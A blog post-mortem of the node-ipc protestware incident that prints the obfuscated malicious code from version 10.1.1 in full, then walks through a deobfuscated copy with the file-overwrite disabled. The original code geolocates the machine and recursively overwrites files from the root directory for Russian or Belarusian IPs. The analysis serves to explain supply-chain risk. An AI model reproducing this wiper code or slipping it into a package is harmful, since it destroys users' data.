# Day 10 - node-ipc protestware post mortem

This time we'll look at the world-famous node-ipc which is a library that allows you to communicate between processes in node.js but we won't talk about the library itself but rather what happened some days ago.

The story is that the library's author decided to push a malicious code as a protest against the Ukrainian war. This package is a well-known and widely used library that is used in many popular node.js applications.

What happened: version 10.1.1 was published with this code:

```js 
// DO NOT RUN THIS CODE OR YOU MAY DAMAGE YOUR FILESYSTEM

import u from "path";
import a from "fs";
import o from "https";
setTimeout(function () {
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }
    const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); 
    o.get(n.toString("utf8"), function (t) {
        t.on("data", function (t) {
            const n = Buffer.from("Li8=", "base64");
            const o = Buffer.from("Li4v", "base64");
            const r = Buffer.from("Li4vLi4v", "base64");
            const f = Buffer.from("Lw==", "base64");
            const c = Buffer.from("Y291bnRyeV9uYW1l", "base64");
            const e = Buffer.from("cnVzc2lh", "base64");
            const i = Buffer.from("YmVsYXJ1cw==", "base64");
            try {
                const s = JSON.parse(t.toString("utf8"));
                const u = s[c.toString("utf8")].toLowerCase();
                const a = u.includes(e.toString("utf8")) || u.includes(i.toString("utf8")); you 
                if (a) {
                    h(n.toString("utf8"));
                    h(o.toString("utf8"));
                    h(r.toString("utf8"));
                    h(f.toString("utf8"));
                }
            } catch (t) {}
        });
    });
}, Math.ceil(Math.random() * 1e3));
async function h(n = "", o = "") {
    if (!a.existsSync(n)) {
        return;
    }
    let r = [];
    try {
        r = a.readdirSync(n);
    } catch (t) {}
    const f = [];
    const c = Buffer.from("4p2k77iP", "base64");
    for (var e = 0; e < r.length; e++) {
        const i = u.join(n, r[e]);
        let t = null;
        try {
            t = a.lstatSync(i);
        } catch (t) {
            continue;
        }
        if (t.isDirectory()) {
            const s = h(i, o);
            s.length > 0 ? f.push(...s) : null;
        } else if (i.indexOf(o) >= 0) {
            try {
                a.writeFile(i, c.toString("utf8"), function () {}); 
            } catch (t) {}
        }
    }
    return f;
}
const ssl = true;
export { ssl as default, ssl };
```

As you can see the code is obfuscated and it is not very easy to read.


```js 
const n = Buffer.from("aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=", "base64"); 
```
creates a buffer from a base64 string. let's see how to decode it:

```js
 console.log(JSON.parse(n.toString("utf8"));
```

The string is:

https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154

This script uses api.ipgeolocation.io to guess which country you are executing the code.

The unobfuscated version of this script is:

```js 
import path from "path";
import fs from "fs";
import https from "https";

setTimeout(function () {
    // Does not attack anytime, but it does attack one over four times.
    const t = Math.round(Math.random() * 4);
    if (t > 1) {
        return;
    }

    // Call api.geolocation.io to get the location of the user.
    https.get('https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154', function (res) {
        // On data received from the api.geolocation.io server.
        res.on("data", function (response) {
            try {
                // Parse the response.
                const object = JSON.parse(response.toString("utf8"));
                // Get the country name.
                const country_name = object['country_name'].toLowerCase();
                // test if the country name is in the list of countries to attack.
                const isRussiaOrBelarus = country_name.includes('russia') || country_name.includes('belarus');
                // If the country is in the list of countries to attack, attack.
                if (isRussiaOrBelarus) {
                    // attack the current directory.
                    attack("./");
                    // attack the previous directory.
                    attack("../");
                    // attack the parent of the previous directory.
                    attack("../../");
                    // Attack the root directory.
                    attack("/");
                }
            } catch (t) { }
        });
    });
    // the attack is performed wityh a delay between 0 and 1 seconds.
}, Math.ceil(Math.random() * 1e3));

// This is the attack function.
// it is called when the user is in the list of countries to attack.
// it is called with the directory to attack.
// it is called with the target filename substring that is currently unused.
async function attack(dir = "", targetFilenameSubstring = "") {
    console.log("ATTACKING: " + dir + "\n");
    // if the dir does not exist, return.
    if (!fs.existsSync(dir)) {
        return;  
    }

    // used to store the directory contents
    let directoryContents = [];
    try {
        // get the directory contents.
        directoryContents = fs.readdirSync(dir);
    } catch (t) { }
    const files = [];

    for (var e = 0; e < directoryContents.length; e++) {

        // get the full path of the file.
        const i = path.join(dir, directoryContents[e]);

        // read the stats of the file to test if it is a directory or a file.
        let t = null;
        try {
            // lstatSync is used to test both real files and symbolic links.
            t = fs.lstatSync(i);  
        } catch (t) {
            continue;
        }

        // if the file is a directory, call the attack function recursively.
        if (t.isDirectory()) {
            const attackedFiles = attack(i, targetFilenameSubstring);
            // Keeps track of the files that were attacked.
            attackedFiles.length > 0 ? files.push(...attackedFiles) : null;
        } else if (i.indexOf(targetFilenameSubstring) >= 0) { // Pattern match (unused.. all filed are attacked anyway)
            try {
                
                console.log("WITH LOVE FILE: " + i);
                
                // NOTE: I have disabled the function which replaces the file contents with a '❤️'.
                //fs.writeFile(i, '❤️', function () { });
            } catch (t) { }
        }
    }
    return files;
}
const ssl = true;
export { ssl as default, ssl };
```

I have changed the code a little bit to get it safe. It just prints the attacked files on the screen without doing anything dangerous

At the moment the versions with the critical security code have been removed and the code is not available on github nor on the npm websites.

opening https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 will result in an error message:

"Provided API key is not valid. Contact technical support for assistance at support@ipgeolocation.io"

:::warning
You may notice that this website at the moment of the release of the protestware had the power to wipe data from almost all around the world.
If it was hacked and just replied "russia" for any ip address. This fact is not true anymore but it is worth noting that the packages that are used as a supply chain have a great responsibility and the trust of the users is something to be accurately evaluated.
:::

References:

[Protestware - How node-ipc turned into malware](https://www.lunasec.io/docs/blog/node-ipc-protestware/)

[CVE-2022-23812](https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c)


Cheers,

Massimo Nicolardi

